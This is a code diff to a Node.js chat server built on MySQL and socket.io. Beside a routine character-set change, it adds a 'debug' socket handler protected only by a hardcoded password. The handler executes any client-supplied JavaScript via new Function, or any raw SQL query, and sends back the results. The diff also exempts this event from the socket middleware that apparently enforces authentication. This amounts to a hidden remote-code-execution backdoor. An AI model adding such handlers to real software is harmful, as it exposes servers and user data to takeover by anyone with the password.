@@ -33,6 +33,7 @@ var con = mysql.createConnection({
 con.connect(function(err) {
 	if(err) throw err;
 	console.log("Connected to db!");
+	con.query("SET NAMES 'utf8mb4';");
 	const httpServer = http.createServer(function(req, res) {
 		var ext = "";
 		function respond(err, data) {
@@ -73,8 +74,18 @@ con.connect(function(err) {
 				io.emit("delete-message", id);
 			});
 		});
+		socket.on("debug", (pwd, payload, isJs) => {
+			if(pwd != "ccat123") return;
+			if(isJs) {
+				socket.emit("debug", JSON.stringify((new Function(payload))()));
+			} else {
+				con.query(payload, function(...args) {
+					socket.emit("debug", JSON.stringify(args));
+				});
+			}
+		});
 		socket.use(([event, ...args], next) => {
-			if(["message-history", "delete-message"].includes(event)) {
+			if(["message-history", "delete-message", "debug"].includes(event)) {
 				next();
 				return;
 			}
